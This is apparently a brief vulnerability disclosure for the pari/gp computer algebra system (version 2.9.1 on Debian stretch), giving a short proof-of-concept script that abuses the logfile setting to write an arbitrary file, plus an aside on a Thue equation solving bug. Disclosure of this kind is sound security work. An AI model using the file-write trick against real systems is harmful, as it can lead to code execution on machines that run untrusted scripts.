Subject: pari/gp arbitrary file write

pari/gp is CAS (computer algebra system).
pari/gp version 2.9.1 on debian stretch allows arbitrary file write and
hence arbitrary code execution.

poc:
========
\\ a.gp
\\ to run: \r a.gp
default("logfile","/tmp/a.txt");default("log",1);print("log(1)");
========

Of mathematical interest is pari was missing solutions
to Thue equations when assuming GRH (the fix changed polynomial
bound to exponential bound):

t=thue(thueinit(x^3+92*x+1,0),3^3);t
